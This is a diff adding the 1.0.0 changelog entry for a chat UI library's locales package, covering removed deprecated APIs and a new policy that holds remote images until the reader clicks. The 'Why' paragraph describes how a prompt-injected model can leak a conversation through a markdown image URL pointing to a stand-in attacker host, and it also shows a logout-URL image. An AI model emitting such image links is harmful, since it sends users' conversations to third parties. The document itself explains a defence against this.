@@ -1,5 +1,44 @@
 # @aparte/locales
 
+## 1.0.0
+
+### Major Changes
+
+- 224afde: Everything marked deprecated is removed. If your code uses none of the names below, nothing changes; otherwise replace each one as its line says.
+
+  - `<aparte-context auto-compact>`, deprecated in 0.26.0: remove the attribute. The gauge no longer asks for a compaction; `@aparte/plugin-compaction` compacts by itself once it is set up (past 80 % of the window by default).
+  - The `compactionSummaryTitle` locale key, deprecated in 0.26.0: remove it from your locale. Nothing has read it since 0.26.0, and the nine locales of `@aparte/locales` no longer carry it.
+  - The `window` field of an `aparte-compact` request's detail, read "for one more release" since 0.26.0: give `setupCompaction` a `contextWindow` instead, or let the model declare its window.
+  - The viewport's `clearMessages()`, deprecated since 0.4.0: call `clearAll()`, which also removes the bubbles. `clearMessages()` on `<aparte-chat>`, on the framework components and on the imperative API is unchanged.
+  - `AparteMessageBranch` and the `branches` / `activeBranchIndex` fields of `AparteMessage`, deprecated since 0.4.0 and read by nothing: branches are the message tree (`addSiblingOf`, `navigateBranch`, `aparte-path-changed`).
+  - `AparteCodeSegment.showLineNumbers` and `AparteErrorSegment.stack`, deprecated in 0.19.3 and read by nothing: put a stack in `details`.
+
+### Minor Changes
+
+- 67efebe: A picture a model or a tool chose no longer loads by itself: `data:` and `blob:` pictures do, and any other shows as a link naming its host until the reader clicks it. To load your own, call `aparteGlobalConfig.setImagePolicy(['self', 'https://cdn.example.com'])`; `['*']` loads every picture, as before.
+
+  - **Why.** A picture fetches its address the moment it is shown, before anyone reads the reply, and a prompt-injected model can write the conversation into that address: `![](https://attacker.example/c.png?d=…)` sent it, the reader's IP and their browser to that host with no click — while the reply streamed, and again each time the conversation was shown. The page's own site is not trusted by default either: its pictures carry the reader's cookies (`![](/api/logout)`), and an open redirect on it turns a picture from the site into a picture from anywhere.
+  - **In a reply.** A held picture is a small link that says where it would load from (inside a link of the reply's own, a button, so that link stays whole). A click loads it in place, and the chat remembers the choice; a click with a modifier key is left to the browser, as for any link. `config.sanitizeHtml` applies the policy after whichever sanitizer is set, so DOMPurify or your own keeps it, and `@aparte/plugin-streaming-markdown` applies it before any `src` is set, so nothing is fetched while a reply streams. A picture's own address decides; of its `srcset`, only the candidates that load are kept, written again so a browser can only pick an address that was judged.
+  - **In a card.** `@aparte/plugin-cards` draws a card without the pictures the policy held, and one "Show images" button with every host they would load from beside it; pressing it draws them. A card of your own asks through `ctx.image(src, props)` and `ctx.loads(url)`.
+  - **The rule.** `setImagePolicy` takes a list (`'self'`, `'*'`, origins) or a function `(url) => 'load' | 'hold' | 'drop'`. `config.decideImage(url)` answers for a plugin that draws pictures itself, and `config.showImage(url)` records the reader's choice. Every picture that loads goes with `referrerpolicy="no-referrer"`. A CSP `img-src` is the stronger rule beside it: it also checks where a redirect leads.
+  - Two locale keys, `imageLoad` and `imageLoadNamed`, name a held picture; `@aparte/locales` carries them in its nine languages.
+  - **The console says why.** Until the app names a policy, the first picture held on a page writes one note in the console, with its host and the line to add; `setImagePolicy([])` keeps the default and silences it.
+
+### Patch Changes
+
+- Updated dependencies [26ddd6c]
+- Updated dependencies [e97d464]
+- Updated dependencies [0a6dd91]
+- Updated dependencies [635f69b]
+- Updated dependencies [224afde]
+- Updated dependencies [2e5c5ab]
+- Updated dependencies [67efebe]
+- Updated dependencies [99fcc42]
+- Updated dependencies [e97d464]
+- Updated dependencies [048864d]
+- Updated dependencies [99784ad]
+  - @aparte/core@1.0.0
+
 ## 0.32.1
 
 ## 0.32.0
